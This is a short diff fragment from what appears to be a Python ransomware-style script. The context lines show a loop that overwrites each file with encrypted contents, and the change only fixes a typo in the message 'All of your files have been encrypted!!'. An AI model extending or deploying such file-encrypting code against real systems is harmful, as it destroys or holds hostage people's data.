@@ -25,4 +25,4 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("All of your files have benn encrypted!!")
+print("All of your files have been encrypted!!")
